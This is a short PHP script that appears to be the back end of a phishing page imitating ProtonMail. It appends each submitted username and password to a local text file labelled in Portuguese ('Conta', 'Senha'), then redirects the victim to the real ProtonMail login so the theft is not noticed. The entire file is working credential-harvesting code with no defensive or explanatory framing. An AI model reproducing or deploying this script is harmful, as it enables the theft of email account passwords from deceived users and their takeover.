<?php

file_put_contents("usernames.txt", "Conta: " . $_POST['username'] . " Senha: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://mail.protonmail.com');
exit();
